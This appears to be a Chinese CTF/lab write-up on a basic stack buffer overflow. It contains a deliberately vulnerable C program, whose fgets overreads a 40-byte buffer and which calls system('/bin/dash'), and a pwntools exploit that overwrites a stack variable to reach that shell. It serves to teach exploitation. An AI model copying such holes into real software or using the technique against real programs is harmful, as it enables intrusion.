第一道题，通过fgets读取超过缓冲区的char数组溢出，修改栈上的变量check，实现程序流跳转，达到hack的目的。非常简单的一道题，需要注意是编译32位程序在Ubuntu22.04上需要安装对应组件，否则hack会失败。
来看源代码：
```c
#include <stdlib.h>
#include <stdio.h>

/*
gcc -o buf1 buf1.c -fno-stack-protector
*/

int main() {

    int var;
    int check = 0x04030201;
    char buf[40];

    fgets(buf,45,stdin);

    printf("\n[buf]: %s\n", buf);
    printf("[check] %p\n", check);

    if ((check != 0x04030201) && (check != 0xdeadbeef))
        printf ("\nYou are on the right way!\n");

    if (check == 0xdeadbeef) {
        printf("Yeah dude! You win!\nOpening your shell...\n");
        system("/bin/dash");
        printf("Shell closed! Bye.\n");
    }
    return 0;
}

```
首先我们需要知道，局部变量var，check，buf均分配在栈上，且依次向下排列。通过gdb也可看出这一点。
![Pwnhub-2024-05-20-16-32-43.png](https://cdn.nlark.com/yuque/0/2024/png/43291115/1716194020290-959dc4b4-3c71-49c0-ba16-a69bdd38cdac.png#averageHue=%23535b3e&clientId=u9fb7d550-319e-4&from=ui&height=875&id=u603e8b9b&originHeight=1440&originWidth=2560&originalType=binary&ratio=1&rotation=0&showTitle=false&size=2571969&status=done&style=none&taskId=u8e3a9981-cc0b-433c-9bc3-b7c6de493aa&title=&width=1555)
栈上的空间如下图所示：
![](https://cdn.nlark.com/yuque/0/2024/jpeg/43291115/1716194474095-b5a6a4fd-82f5-4381-926b-22ac9e2e0072.jpeg)
之后是fgets从stdin读入45个字符，判断check是否为0xdeadbeef。
一个非常直观的想法就是，通过payload构造将buf上的check变量值覆盖为0xdeadbeef。
所以exploit如下：
```python
from pwn import *

ex = process('./buf1')
payload = b"a" * 40 + p32(0xdeadbeef) # type: ignore
ex.sendline(payload)
ex.recvline()
ex.interactive()
```
执行即可实现提权。
